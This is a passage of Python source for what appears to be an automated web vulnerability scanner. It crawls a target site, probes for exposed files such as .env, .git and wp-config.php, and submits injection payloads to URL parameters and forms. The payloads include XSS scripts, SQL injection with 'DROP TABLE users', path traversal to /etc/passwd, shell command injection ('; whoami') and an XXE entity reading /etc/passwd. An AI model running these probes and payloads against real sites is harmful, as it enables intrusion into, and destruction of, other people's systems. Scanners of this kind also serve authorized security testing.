                text = link.text.strip()
                
                if not href or not href.startswith('http'):
                    continue
                
                link_data = {'url': href, 'text': text}
                
                # Categorize links
                if self.target_domain in href:
                    categorized_links['internal'].append(link_data)
                    
                    # Check for suspicious patterns
                    suspicious_patterns = ['admin', 'login', 'panel', 'control', 'manage', 'config', 'debug', 'test']
                    if any(pattern in href.lower() for pattern in suspicious_patterns):
                        categorized_links['suspicious'].append(link_data)
                        
                    # Check for admin patterns
                    admin_patterns = ['admin', 'administrator', 'control', 'panel', 'manage']
                    if any(pattern in href.lower() for pattern in admin_patterns):
                        categorized_links['admin'].append(link_data)
                        
                    # Check for API endpoints
                    api_patterns = ['api', 'rest', 'graphql', 'json', 'xml', 'endpoint']
                    if any(pattern in href.lower() for pattern in api_patterns):
                        categorized_links['api'].append(link_data)
                else:
                    categorized_links['external'].append(link_data)
                    
            except Exception:
                continue
        
        # Display results
        for category, links in categorized_links.items():
            if links:
                print(f"    📂 {category.upper()}: {len(links)} links")
                for link in links[:3]:  # Show first 3
                    print(f"      • {link['text']} → {link['url']}")
        
        self.discovered_assets['links'] = categorized_links

    async def _discover_advanced_forms(self):
        """Advanced form discovery with input analysis"""
        print("  📝 Advanced Form Analysis:")
        
        forms = self.driver.find_elements(By.TAG_NAME, "form")
        
        for i, form in enumerate(forms):
            try:
                action = form.get_attribute("action") or self.driver.current_url
                method = form.get_attribute("method") or "GET"
                form_id = form.get_attribute("id") or f"form_{i}"
                
                print(f"    📋 Form {i+1}: {method.upper()} → {action}")
                
                # Analyze inputs
                inputs = form.find_elements(By.TAG_NAME, "input")
                textareas = form.find_elements(By.TAG_NAME, "textarea")
                selects = form.find_elements(By.TAG_NAME, "select")
                
                form_data = {
                    'action': action,
                    'method': method,
                    'inputs': [],
                    'vulnerability_score': 0
                }
                
                # Analyze each input
                all_inputs = inputs + textareas + selects
                for inp in all_inputs:
                    input_type = inp.get_attribute("type") or "text"
                    name = inp.get_attribute("name") or "unnamed"
                    placeholder = inp.get_attribute("placeholder") or ""
                    value = inp.get_attribute("value") or ""
                    
                    input_data = {
                        'type': input_type,
                        'name': name,
                        'placeholder': placeholder,
                        'value': value,
                        'vulnerable_to': []
                    }
                    
                    # Assess vulnerability potential
                    if input_type in ['text', 'search', 'url', 'email']:
                        input_data['vulnerable_to'].extend(['xss', 'sqli', 'lfi'])
                        form_data['vulnerability_score'] += 3
                    elif input_type == 'password':
                        input_data['vulnerable_to'].extend(['sqli', 'timing_attack'])
                        form_data['vulnerability_score'] += 2
                    elif input_type == 'file':
                        input_data['vulnerable_to'].extend(['file_upload', 'path_traversal'])
                        form_data['vulnerability_score'] += 4
                    
                    form_data['inputs'].append(input_data)
                    print(f"      • {input_type}: {name} (Risk: {len(input_data['vulnerable_to'])})")
                
                self.discovered_assets['forms'][form_id] = form_data
                
            except Exception as e:
                continue

    async def _analyze_javascript(self):
        """Analyze JavaScript for potential vulnerabilities"""
        print("  🔬 JavaScript Analysis:")
        
        try:
            # Extract inline scripts
            scripts = self.driver.find_elements(By.TAG_NAME, "script")
            js_content = ""
            
            for script in scripts:
                content = script.get_attribute("innerHTML")
                if content:
                    js_content += content + "\n"
            
            # Look for sensitive patterns
            sensitive_patterns = {
                'API Keys': r'api[_-]?key[\'\"]\s*[:=]\s*[\'\"]\w+',
                'Passwords': r'password[\'\"]\s*[:=]\s*[\'\"]\w+',
                'Tokens': r'token[\'\"]\s*[:=]\s*[\'\"]\w+',
                'URLs': r'https?://[^\s\'"]+',
                'AJAX Endpoints': r'ajax|xhr|fetch\([\'\"](/[^\'"]+)',
                'DOM Manipulation': r'innerHTML|document\.write|eval\(',
                'Local Storage': r'localStorage|sessionStorage'
            }
            
            js_findings = {}
            for pattern_name, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                if matches:
                    js_findings[pattern_name] = matches[:5]  # Limit results
                    print(f"    • {pattern_name}: {len(matches)} occurrences")
            
            self.discovered_assets['javascript'] = js_findings
            
        except Exception as e:
            print(f"    ❌ JavaScript analysis failed: {e}")

    async def _analyze_cookies_sessions(self):
        """Analyze cookies and session management"""
        print("  🍪 Cookie & Session Analysis:")
        
        try:
            cookies = self.driver.get_cookies()
            
            for cookie in cookies:
                name = cookie.get('name', 'unknown')
                value = cookie.get('value', '')
                secure = cookie.get('secure', False)
                httponly = cookie.get('httpOnly', False)
                
                security_score = 0
                issues = []
                
                if not secure:
                    issues.append("Not Secure")
                    security_score += 1
                    
                if not httponly:
                    issues.append("Not HttpOnly")
                    security_score += 1
                
                if len(value) > 50:  # Long values might be sensitive
                    issues.append("Long Value")
                    security_score += 1
                
                print(f"    • {name}: Security Issues: {len(issues)}")
                
                self.discovered_assets['cookies'][name] = {
                    'value': value[:20] + "..." if len(value) > 20 else value,
                    'secure': secure,
                    'httponly': httponly,
                    'issues': issues,
                    'security_score': security_score
                }
                
        except Exception as e:
            print(f"    ❌ Cookie analysis failed: {e}")

    async def _discover_hidden_parameters(self):
        """Discover hidden parameters through various techniques"""
        print("  🔍 Hidden Parameter Discovery:")
        
        # Common parameter names to test
        common_params = [
            'debug', 'test', 'admin', 'user', 'id', 'action', 'cmd', 'exec',
            'file', 'path', 'dir', 'page', 'include', 'cat', 'detail',
            'source', 'data', 'input', 'query', 'search', 'filter'
        ]
        
        current_url = self.driver.current_url
        base_url = current_url.split('?')[0]
        
        discovered_params = []
        
        for param in common_params[:10]:  # Test first 10 to save time
            test_url = f"{base_url}?{param}=test"
            
            try:
                response = await asyncio.to_thread(
                    self.session.get, test_url, timeout=5
                )
                
                # Check if parameter has effect (different response)
                if response.status_code == 200:
                    # Simple heuristic: different content length suggests parameter is processed
                    original_length = len(self.driver.page_source)
                    
                    self.driver.get(test_url)
                    await asyncio.sleep(1)
                    new_length = len(self.driver.page_source)
                    
                    if abs(new_length - original_length) > 50:  # Significant difference
                        discovered_params.append(param)
                        print(f"    • Potential parameter: {param}")
                        
            except Exception:
                continue
        
        self.discovered_assets['parameters']['hidden'] = discovered_params
        
        # Go back to original page
        self.driver.get(current_url)

    async def intelligent_exploration(self):
        """Phase 2: Advanced Tree-Like Deep Exploration - Explores EVERYTHING recursively"""
        print("🕷️ Phase 2: Advanced Tree-Like Deep Exploration...")
        print("🌳 Implementing comprehensive tree traversal algorithm...")
        
        # Initialize exploration tree
        self.exploration_tree = {
            'root': self.target_url,
            'branches': {},
            'explored_paths': set(),
            'pending_paths': set(),
            'directory_structure': {},
            'file_extensions': set(),
            'parameters_discovered': {},
            'depth_stats': {}
        }
        
        # Start tree exploration from root
        await self._explore_tree_recursively(self.target_url, depth=0, max_depth=6)
        
        # Generate comprehensive path permutations
        await self._generate_path_permutations()
        
        # Explore discovered directories systematically
        await self._systematic_directory_exploration()
        
        # Test all discovered parameters
        await self._comprehensive_parameter_testing()
        
        # Smart form discovery across all pages
        await self._comprehensive_form_discovery()
        
        print(f"🌳 Tree exploration completed:")
        print(f"  📊 Total paths explored: {len(self.exploration_tree['explored_paths'])}")
        print(f"  📁 Directories discovered: {len(self.exploration_tree['directory_structure'])}")
        print(f"  📄 File extensions found: {len(self.exploration_tree['file_extensions'])}")
        print(f"  🔍 Parameters discovered: {len(self.exploration_tree['parameters_discovered'])}")

    async def _explore_tree_recursively(self, url, depth=0, max_depth=6):
        """Recursively explore the website like a tree structure"""
        if depth > max_depth or url in self.exploration_tree['explored_paths']:
            return
        
        try:
            print(f"  {'  ' * depth}🌿 Exploring (depth {depth}): {url}")
            
            self.exploration_tree['explored_paths'].add(url)
            self.exploration_tree['depth_stats'][depth] = self.exploration_tree['depth_stats'].get(depth, 0) + 1
            
            # Navigate to URL
            self.driver.get(url)
            await asyncio.sleep(2)
            
            page_source = self.driver.page_source
            page_title = self.driver.title
            current_url = self.driver.current_url
            
            # Extract and analyze page structure
            page_info = await self._analyze_page_structure(url, page_source, page_title)
            self.discovered_assets['pages'][url] = page_info
            
            # Discover all links on this page
            discovered_links = await self._extract_all_links_advanced()
            
            # Discover forms and interactive elements
            await self._discover_advanced_forms()
            
            # Extract parameters from current page
            await self._extract_page_parameters(url, page_source)
            
            # Analyze directory structure
            self._analyze_directory_structure(url)
            
            # Find and test API endpoints on this page
            await self._discover_api_endpoints(page_source)
            
            # Look for hidden directories and files
            await self._probe_hidden_resources(url)
            
            # Recursively explore discovered links
            for link_info in discovered_links:
                link_url = link_info['url']
                if (self.target_domain in link_url and 
                    link_url not in self.exploration_tree['explored_paths'] and
                    depth < max_depth):
                    
                    # Add to tree structure
                    if depth not in self.exploration_tree['branches']:
                        self.exploration_tree['branches'][depth] = []
                    self.exploration_tree['branches'][depth].append({
                        'parent': url,
                        'child': link_url,
                        'link_text': link_info.get('text', ''),
                        'link_type': link_info.get('type', 'unknown')
                    })
                    
                    # Recursively explore
                    await self._explore_tree_recursively(link_url, depth + 1, max_depth)
                    
        except Exception as e:
            print(f"  {'  ' * depth}❌ Error at depth {depth}: {e}")

    async def _analyze_page_structure(self, url, page_source, page_title):
        """Comprehensive page structure analysis"""
        page_info = {
            'title': page_title,
            'url': url,
            'analyzed_at': datetime.now().isoformat(),
            'word_count': len(page_source.split()),
            'size_kb': len(page_source.encode('utf-8')) / 1024,
            'technologies': set(),
            'security_headers': {},
            'forms_count': 0,
            'links_count': 0,
            'javascript_files': [],
            'css_files': [],
            'images': [],
            'comments': [],
            'meta_tags': {},
            'security_indicators': {},
            'potential_vulnerabilities': []
        }
        
        # Extract technologies
        technologies = self._detect_technologies_from_page(page_source)
        page_info['technologies'] = technologies
        self.discovered_assets['technologies'].update(technologies)
        
        # Extract JavaScript files
        js_pattern = r'<script[^>]+src=["\']([^"\']+)["\']'
        js_files = re.findall(js_pattern, page_source, re.IGNORECASE)
        page_info['javascript_files'] = [urljoin(url, js) for js in js_files]
        
        # Extract CSS files
        css_pattern = r'<link[^>]+href=["\']([^"\']+\.css[^"\']*)["\']'
        css_files = re.findall(css_pattern, page_source, re.IGNORECASE)
        page_info['css_files'] = [urljoin(url, css) for css in css_files]
        
        # Extract images
        img_pattern = r'<img[^>]+src=["\']([^"\']+)["\']'
        images = re.findall(img_pattern, page_source, re.IGNORECASE)
        page_info['images'] = [urljoin(url, img) for img in images]
        
        # Extract HTML comments
        comment_pattern = r'<!--(.*?)-->'
        comments = re.findall(comment_pattern, page_source, re.DOTALL)
        page_info['comments'] = [comment.strip() for comment in comments if comment.strip()]
        
        # Extract meta tags
        meta_pattern = r'<meta[^>]+name=["\']([^"\']+)["\'][^>]+content=["\']([^"\']+)["\']'
        meta_tags = re.findall(meta_pattern, page_source, re.IGNORECASE)
        page_info['meta_tags'] = dict(meta_tags)
        
        # Security analysis
        await self._analyze_security_indicators(url, page_source)
        
        return page_info

    async def _extract_all_links_advanced(self):
        """Extract all links with advanced categorization"""
        discovered_links = []
        
        try:
            # Get all anchor tags
            links = self.driver.find_elements(By.TAG_NAME, "a")
            
            for link in links:
                try:
                    href = link.get_attribute("href")
                    text = link.text.strip()
                    
                    if not href or href.startswith(('javascript:', 'mailto:', 'tel:')):
                        continue
                    
                    # Resolve relative URLs
                    full_url = urljoin(self.driver.current_url, href)
                    
                    link_info = {
                        'url': full_url,
                        'text': text,
                        'type': self._categorize_link(full_url, text)
                    }
                    
                    discovered_links.append(link_info)
                    
                except Exception:
                    continue
                    
            # Also extract URLs from JavaScript and other sources
            page_source = self.driver.page_source
            
            # Extract URLs from JavaScript
            js_url_pattern = r'(?:href|src|url|action)\s*[=:]\s*["\']([^"\']+)["\']'
            js_urls = re.findall(js_url_pattern, page_source, re.IGNORECASE)
            
            for url in js_urls:
                if url.startswith(('http', '/', '.')):
                    full_url = urljoin(self.driver.current_url, url)
                    if self.target_domain in full_url:
                        discovered_links.append({
                            'url': full_url,
                            'text': 'Found in JavaScript',
                            'type': 'javascript_extracted'
                        })
            
        except Exception as e:
            print(f"    ❌ Error extracting links: {e}")
        
        return discovered_links

    def _categorize_link(self, url, text):
        """Categorize links for better exploration strategy"""
        url_lower = url.lower()
        text_lower = text.lower()
        
        # Admin/Control panel links
        if any(term in url_lower for term in ['admin', 'control', 'panel', 'manage', 'dashboard']):
            return 'admin'
        
        # API endpoints
        if any(term in url_lower for term in ['api', 'rest', 'graphql', 'json', 'xml', 'endpoint']):
            return 'api'
        
        # File downloads
        if any(url_lower.endswith(ext) for ext in ['.pdf', '.doc', '.xls', '.zip', '.rar', '.tar']):
            return 'download'
        
        # Authentication pages
        if any(term in url_lower for term in ['login', 'signin', 'auth', 'register', 'signup']):
            return 'auth'
        
        # User content
        if any(term in url_lower for term in ['user', 'profile', 'account', 'settings']):
            return 'user'
        
        # Search functionality
        if any(term in url_lower for term in ['search', 'find', 'query']):
            return 'search'
        
        # External links
        if self.target_domain not in url:
            return 'external'
        
        return 'internal'

    async def _extract_page_parameters(self, url, page_source):
        """Extract all parameters from the current page"""
        if url not in self.exploration_tree['parameters_discovered']:
            self.exploration_tree['parameters_discovered'][url] = {}
        
        # Extract parameters from forms
        form_pattern = r'<input[^>]+name=["\']([^"\']+)["\']'
        form_params = re.findall(form_pattern, page_source, re.IGNORECASE)
        
        for param in form_params:
            self.exploration_tree['parameters_discovered'][url][param] = {
                'type': 'form_parameter',
                'source': 'form_input'
            }
        
        # Extract parameters from JavaScript
        js_param_pattern = r'["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']\s*:\s*["\']?[^"\'}\s]+'
        js_params = re.findall(js_param_pattern, page_source)
        
        for param in js_params:
            if len(param) > 2 and param not in ['id', 'class', 'src', 'href']:
                self.exploration_tree['parameters_discovered'][url][param] = {
                    'type': 'javascript_parameter',
                    'source': 'javascript'
                }
        
        # Extract parameters from URL query string
        parsed_url = urlparse(url)
        if parsed_url.query:
            url_params = parse_qs(parsed_url.query)
            for param in url_params.keys():
                self.exploration_tree['parameters_discovered'][url][param] = {
                    'type': 'url_parameter',
                    'source': 'query_string'
                }

    def _analyze_directory_structure(self, url):
        """Analyze and map directory structure"""
        parsed_url = urlparse(url)
        path = parsed_url.path
        
        # Split path into directory components
        path_parts = [part for part in path.split('/') if part]
        
        # Build directory tree
        current_level = self.exploration_tree['directory_structure']
        for part in path_parts[:-1]:  # Exclude filename
            if part not in current_level:
                current_level[part] = {}
            current_level = current_level[part]
        
        # Extract file extension
        if path_parts and '.' in path_parts[-1]:
            ext = path_parts[-1].split('.')[-1].lower()
            self.exploration_tree['file_extensions'].add(ext)

    async def _discover_api_endpoints(self, page_source):
        """Discover API endpoints on the current page"""
        api_patterns = [
            r'/api/[^"\'\s]+',
            r'/rest/[^"\'\s]+',
            r'/graphql[^"\'\s]*',
            r'/v\d+/[^"\'\s]+',
            r'\.json[^"\'\s]*',
            r'\.xml[^"\'\s]*'
        ]
        
        for pattern in api_patterns:
            endpoints = re.findall(pattern, page_source, re.IGNORECASE)
            for endpoint in endpoints:
                full_endpoint = urljoin(self.target_url, endpoint)
                print(f"    🔌 Found API endpoint: {full_endpoint}")
                self.exploration_tree['pending_paths'].add(full_endpoint)

    async def _probe_hidden_resources(self, url):
        """Probe for hidden directories and files from current URL"""
        base_url = '/'.join(url.split('/')[:-1]) + '/' if url.split('/')[-1] else url
        
        hidden_resources = [
            '.htaccess', '.env', '.git/', '.svn/', 'robots.txt', 'sitemap.xml',
            'backup/', 'backups/', 'admin/', 'test/', 'tmp/', 'temp/',
            'config.php', 'wp-config.php', 'database.php', 'phpinfo.php'
        ]
        
        for resource in hidden_resources:
            resource_url = urljoin(base_url, resource)
            try:
                response = await asyncio.to_thread(
                    self.session.head, resource_url, timeout=3
                )
                
                if response.status_code in [200, 403]:
                    print(f"    🔍 Found hidden resource: {resource}")
                    self.exploration_tree['pending_paths'].add(resource_url)
                    
            except Exception:
                continue

    async def _generate_path_permutations(self):
        """Generate intelligent path permutations based on discovered structure"""
        print("  🔄 Generating intelligent path permutations...")
        
        base_paths = [
            '/admin', '/administrator', '/wp-admin', '/manage', '/control',
            '/api', '/rest', '/graphql', '/v1', '/v2', '/docs',
            '/backup', '/backups', '/tmp', '/temp', '/logs',
            '/config', '/configuration', '/settings', '/setup',
            '/test', '/testing', '/dev', '/development', '/debug',
            '/user', '/users', '/profile', '/account', '/accounts',
            '/upload', '/uploads', '/files', '/documents', '/assets',
            '/include', '/includes', '/lib', '/library', '/vendor',
            '/cache', '/cached', '/storage', '/data', '/database'
        ]
        
        extensions = ['.php', '.asp', '.aspx', '.jsp', '.py', '.rb', '.js', '.json', '.xml', '.txt', '.bak', '.old']
        
        # Generate permutations
        for path in base_paths:
            # Test directory
            test_url = urljoin(self.target_url, path)
            await self._test_path_existence(test_url, 'directory')
            
            # Test with trailing slash
            test_url_slash = urljoin(self.target_url, path + '/')
            await self._test_path_existence(test_url_slash, 'directory')
            
            # Test with extensions
            for ext in extensions:
                test_url_file = urljoin(self.target_url, path + ext)
                await self._test_path_existence(test_url_file, 'file')

    async def _test_path_existence(self, url, path_type):
        """Test if a path exists and is accessible"""
        try:
            response = await asyncio.to_thread(
                self.session.head, url, timeout=5, allow_redirects=False
            )
            
            if response.status_code in [200, 301, 302, 403]:
                print(f"    ✅ Found {path_type}: {url} (Status: {response.status_code})")
                
                # Add to exploration tree
                self.exploration_tree['pending_paths'].add(url)
                
                # If it's a 200, explore it further
                if response.status_code == 200:
                    try:
                        self.driver.get(url)
                        await asyncio.sleep(2)
                        await self._discover_advanced_forms()
                        await self._extract_page_parameters(url, self.driver.page_source)
                    except Exception:
                        pass
                        
        except Exception:
            pass

    async def _systematic_directory_exploration(self):
        """Systematically explore all discovered directories"""
        print("  📁 Systematic directory exploration...")
        
        for directory_path in list(self.exploration_tree['pending_paths']):
            if directory_path in self.exploration_tree['explored_paths']:
                continue
                
            try:
                print(f"    📂 Exploring directory: {directory_path}")
                
                self.driver.get(directory_path)
                await asyncio.sleep(2)
                
                page_source = self.driver.page_source
                
                # Check for directory listing
                if 'Index of' in page_source or 'Directory Listing' in page_source:
                    print(f"      🚨 Directory listing enabled: {directory_path}")
                    await self._extract_directory_listing(page_source, directory_path)
                
                # Look for common files in this directory
                await self._probe_common_files(directory_path)
                
                self.exploration_tree['explored_paths'].add(directory_path)
                
            except Exception as e:
                print(f"      ❌ Error exploring directory {directory_path}: {e}")

    async def _extract_directory_listing(self, page_source, base_url):
        """Extract files and subdirectories from directory listing"""
        # Extract links from directory listing
        link_pattern = r'<a href="([^"]+)"[^>]*>([^<]+)</a>'
        links = re.findall(link_pattern, page_source)
        
        for href, text in links:
            if href not in ['..', '../', './']:
                full_url = urljoin(base_url, href)
                print(f"        📄 Found: {text} -> {full_url}")
                self.exploration_tree['pending_paths'].add(full_url)

    async def _probe_common_files(self, directory_url):
        """Probe for common files in a directory"""
        common_files = [
            'index.php', 'index.html', 'index.htm', 'default.php', 'default.html',
            'readme.txt', 'README.md', 'changelog.txt', 'CHANGELOG.md',
            'config.php', 'configuration.php', 'settings.php', 'wp-config.php',
            'database.php', 'db.php', 'connection.php', 'connect.php',
            'backup.sql', 'dump.sql', 'database.sql', 'db.sql',
            'test.php', 'debug.php', 'info.php', 'phpinfo.php',
            '.htaccess', '.env', 'robots.txt', 'sitemap.xml'
        ]
        
        for filename in common_files:
            file_url = urljoin(directory_url, filename)
            try:
                response = await asyncio.to_thread(
                    self.session.head, file_url, timeout=3
                )
                
                if response.status_code == 200:
                    print(f"        ✅ Found file: {filename}")
                    self.exploration_tree['pending_paths'].add(file_url)
                    
            except Exception:
                continue

    async def _comprehensive_parameter_testing(self):
        """Test all discovered parameters comprehensively"""
        print("  🔍 Comprehensive parameter testing...")
        
        for url, params in self.exploration_tree['parameters_discovered'].items():
            print(f"    🧪 Testing parameters in: {url}")
            
            for param_name, param_info in params.items():
                print(f"      🔬 Testing parameter: {param_name}")
                
                # Test various payload types
                test_payloads = {
                    'xss': ["<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"],
                    'sqli': ["' OR '1'='1", "'; DROP TABLE users; --", "1' AND 1=1 UNION SELECT NULL--"],
                    'lfi': ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                    'command': ["; ls -la", "| whoami", "& dir"],
                    'nosql': ["[$ne]=1", "[$regex]=.*", "[$where]=sleep(5000)"]
                }
                
                for payload_type, payloads in test_payloads.items():
                    for payload in payloads:
                        await self._test_parameter_payload(url, param_name, payload, payload_type)

    async def _test_parameter_payload(self, url, param_name, payload, payload_type):
        """Test a specific parameter with a specific payload"""
        try:
            # Parse URL and modify parameter
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[param_name] = [payload]
            
            # Reconstruct URL
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Test the payload
            self.driver.get(test_url)
            await asyncio.sleep(2)
            
            # Check for vulnerability indicators
            vulnerability_found = await self._check_vulnerability_response(payload_type, payload)
            
            if vulnerability_found:
                print(f"        🚨 {payload_type.upper()} vulnerability found in parameter {param_name}")
                await self._record_parameter_vulnerability(url, param_name, payload, payload_type, test_url)
                
        except Exception as e:
            pass

    async def _comprehensive_form_discovery(self):
        """Discover and analyze all forms across all pages"""
        print("  📝 Comprehensive form discovery across all pages...")
        
        for url in self.exploration_tree['explored_paths']:
            try:
                print(f"    📋 Checking forms on: {url}")
                self.driver.get(url)
                await asyncio.sleep(2)
                
                forms = self.driver.find_elements(By.TAG_NAME, "form")
                
                for i, form in enumerate(forms):
                    form_id = f"{url}_form_{i}"
                    await self._analyze_form_comprehensive(form, form_id, url)
                    
            except Exception as e:
                continue

    async def _analyze_form_comprehensive(self, form, form_id, url):
        """Comprehensive form analysis"""
        try:
            action = form.get_attribute("action") or url
            method = form.get_attribute("method") or "GET"
            
            # Get all form inputs
            inputs = form.find_elements(By.TAG_NAME, "input")
            textareas = form.find_elements(By.TAG_NAME, "textarea")
            selects = form.find_elements(By.TAG_NAME, "select")
            
            form_data = {
                'url': url,
                'action': action,
                'method': method.upper(),
                'inputs': [],
                'security_analysis': {}
            }
            
            # Analyze each input
            for inp in inputs:
                input_data = {
                    'name': inp.get_attribute('name'),
                    'type': inp.get_attribute('type'),
                    'value': inp.get_attribute('value'),
                    'required': inp.get_attribute('required') is not None
                }
                form_data['inputs'].append(input_data)
            
            # Store form data
            self.discovered_assets['forms'][form_id] = form_data
            
            # Test form with various payloads
            await self._test_form_comprehensive(form, form_data, form_id)
            
        except Exception as e:
            print(f"      ❌ Error analyzing form: {e}")

    async def _test_form_comprehensive(self, form, form_data, form_id):
        """Test form with comprehensive payload set"""
        test_payloads = {
            'xss': ["<script>alert('XSS')</script>", "'\"><svg/onload=alert('XSS')>"],
            'sqli': ["' OR 1=1--", "'; DROP TABLE users; --"],
            'lfi': ["../../../etc/passwd", "..\\windows\\system32\\drivers\\etc\\hosts"],
            'command': ["; whoami", "| id", "& dir"],
            'xxe': ["<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>"]
        }
        
        for payload_type, payloads in test_payloads.items():
            for payload in payloads[:2]:  # Test first 2 payloads of each type
                try:
                    # Find text inputs in the form
                    text_inputs = form.find_elements(By.CSS_SELECTOR, 
                        "input[type='text'], input[type='search'], input:not([type]), textarea")
                    
                    if text_inputs:
                        text_input = text_inputs[0]
                        text_input.clear()
                        text_input.send_keys(payload)
                        
                        # Submit form
                        submit_buttons = form.find_elements(By.CSS_SELECTOR, 
                            "input[type='submit'], button[type='submit'], button")
                        
                        if submit_buttons:
                            submit_buttons[0].click()
                            await asyncio.sleep(2)
                            
                            # Check for vulnerability
                            vuln_found = await self._check_vulnerability_response(payload_type, payload)
                            
                            if vuln_found:
                                print(f"        🚨 {payload_type.upper()} vulnerability in form {form_id}")
                                await self._record_form_vulnerability(form_data, payload, payload_type, form_id)
                            
                            # Go back for next test
                            self.driver.back()
                            await asyncio.sleep(1)
                            
                except Exception:
                    continue

    async def _record_parameter_vulnerability(self, url, param_name, payload, vuln_type, test_url):
        """Record a parameter vulnerability"""
        vuln_id = f"param_{vuln_type}_{param_name}_{int(time.time())}"
        
        self.discovered_assets['vulnerabilities'][vuln_id] = {
            'type': f'parameter_{vuln_type}',
            'severity': 'high' if vuln_type in ['sqli', 'command'] else 'medium',
            'parameter': param_name,
            'payload': payload,
            'vulnerable_url': test_url,
            'original_url': url,
            'attack_vector': f'URL parameter injection via {param_name}',
            'timestamp': datetime.now().isoformat()
        }

    async def _record_form_vulnerability(self, form_data, payload, vuln_type, form_id):
        """Record a form vulnerability"""
        vuln_id = f"form_{vuln_type}_{form_id}_{int(time.time())}"
        
        self.discovered_assets['vulnerabilities'][vuln_id] = {
            'type': f'form_{vuln_type}',
            'severity': 'critical' if vuln_type in ['sqli', 'command'] else 'high',
            'form_action': form_data['action'],
            'form_method': form_data['method'],
            'payload': payload,
            'vulnerable_url': form_data['url'],
            'attack_vector': f'Form submission with {vuln_type} payload',
            'timestamp': datetime.now().isoformat()
        }
    def _detect_technologies_from_page(self, page_source):
        """Enhanced technology detection from page source"""
        technologies = set()
        
        # Enhanced detection patterns
        tech_patterns = {
            'WordPress': [r'wp-content', r'wp-includes', r'/wp-admin/', r'WordPress'],
            'Drupal': [r'drupal', r'sites/default', r'misc/drupal'],
            'Joomla': [r'joomla', r'components/com_', r'templates/'],
            'Laravel': [r'laravel_session', r'_token', r'laravel'],
            'Django': [r'csrfmiddlewaretoken', r'django', r'__static_version__'],
            'React': [r'react', r'reactjs', r'_react'],
            'Angular': [r'angular', r'ng-', r'angularjs'],
            'Vue.js': [r'vue\.js', r'vuejs', r'v-'],
            'jQuery': [r'jquery', r'\\$\\('],
            'Bootstrap': [r'bootstrap', r'bs-'],
            'PHP': [r'\.php', r'php'],
            'ASP.NET': [r'aspx', r'asp\.net', r'__doPostBack'],
            'JSP': [r'\.jsp', r'jsessionid'],
            'Node.js': [r'express', r'nodejs'],
            'Apache': [r'apache', r'server: apache'],
            'Nginx': [r'nginx', r'server: nginx'],
            'IIS': [r'iis', r'server: microsoft-iis'],
            'Cloudflare': [r'cloudflare', r'cf-ray'],
            'Google Analytics': [r'google-analytics', r'gtag', r'ga\\('],
            'Adobe Experience': [r'adobe', r'omniture'],
            'Shopify': [r'shopify', r'shopifycdn'],
            'Magento': [r'magento', r'mage/cookies'],
            'PrestaShop': [r'prestashop', r'prestashop'],
        }
        
        page_source_lower = page_source.lower()
        
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if re.search(pattern, page_source_lower, re.IGNORECASE):
                    technologies.add(tech)
                    break
        
        return technologies

    async def _analyze_security_indicators(self, url, page_source):
        """Enhanced security indicators analysis"""
        indicators = {
            'errors': ['error', 'warning', 'exception', 'stack trace', 'debug', 'fatal'],
            'database': ['mysql', 'postgresql', 'oracle', 'sql server', 'mongodb', 'sqlite'],
            'admin': ['admin', 'administrator', 'control panel', 'dashboard', 'management'],
            'auth': ['login', 'signin', 'authenticate', 'password', 'username', 'auth'],
            'sensitive': ['config', 'backup', 'log', 'dump', 'secret', 'key', 'token'],
            'development': ['test', 'debug', 'dev', 'development', 'staging'],
            'api': ['api', 'rest', 'graphql', 'endpoint', 'json', 'xml'],
            'upload': ['upload', 'file', 'attachment', 'media'],
            'search': ['search', 'query', 'find', 'lookup'],
            'payment': ['payment', 'checkout', 'cart', 'order', 'billing']
        }
        
        content_lower = page_source.lower()
        findings = {}
        
        for category, keywords in indicators.items():
            matches = sum(1 for keyword in keywords if keyword in content_lower)
            if matches > 0:
                findings[category] = matches
                print(f"    🔍 {category.title()}: {matches} indicators")
        
        if findings:
            if url not in self.discovered_assets['pages']:
                self.discovered_assets['pages'][url] = {}
            self.discovered_assets['pages'][url]['indicators'] = findings

        # Check for specific security issues
        await self._check_security_issues(url, page_source)

    async def _check_security_issues(self, url, page_source):
        """Check for specific security issues"""
        security_issues = []
        
        # Check for sensitive information exposure
        if any(term in page_source.lower() for term in ['password', 'secret', 'api_key', 'token']):
            security_issues.append('potential_sensitive_info_exposure')
        
        # Check for debugging information
        if any(term in page_source.lower() for term in ['debug', 'trace', 'stack trace']):
            security_issues.append('debug_information_disclosure')
        
        # Check for admin interfaces
        if any(term in page_source.lower() for term in ['admin panel', 'administrator', 'control panel']):
            security_issues.append('admin_interface_exposed')
        
        # Check for database errors
        if any(term in page_source.lower() for term in ['mysql_', 'ora-', 'sql error', 'database error']):
            security_issues.append('database_error_disclosure')
        
        # Check for file inclusion indicators
        if any(term in page_source.lower() for term in ['include(', 'require(', 'file_get_contents']):
            security_issues.append('potential_file_inclusion')
        
        if security_issues:
            print(f"    ⚠️  Security issues detected: {', '.join(security_issues)}")
            if url not in self.discovered_assets['pages']:
                self.discovered_assets['pages'][url] = {}
            self.discovered_assets['pages'][url]['security_issues'] = security_issues

    async def advanced_vulnerability_testing(self):
        """Phase 3: Advanced comprehensive vulnerability testing with enhanced detection"""
        print("🧪 Phase 3: Advanced Comprehensive Vulnerability Testing...")
        
        # Test forms with comprehensive payloads
        await self._test_forms_comprehensively()
        
        # Test URL parameters extensively  
        await self._test_url_parameters()
        
        # Test HTTP headers and methods
        await self._test_http_headers()
        
        # Test for authentication bypasses
        await self._test_auth_bypasses()
        
        # Test for business logic flaws
        await self._test_business_logic()
        
        # WordPress-specific vulnerability testing
        await self._test_wordpress_vulnerabilities()
        
        # Test for OWASP Top 10 vulnerabilities
        await self._test_owasp_top10()
        
        # Test for file upload vulnerabilities
        await self._test_file_upload_vulnerabilities()
        
        # Test for server-side request forgery (SSRF)
        await self._test_ssrf_vulnerabilities()
        
        # Test for XML external entity (XXE) injection
        await self._test_xxe_vulnerabilities()
        
        # Test for NoSQL injection
        await self._test_nosql_injection()
        
        # Test for LDAP injection
        await self._test_ldap_injection()
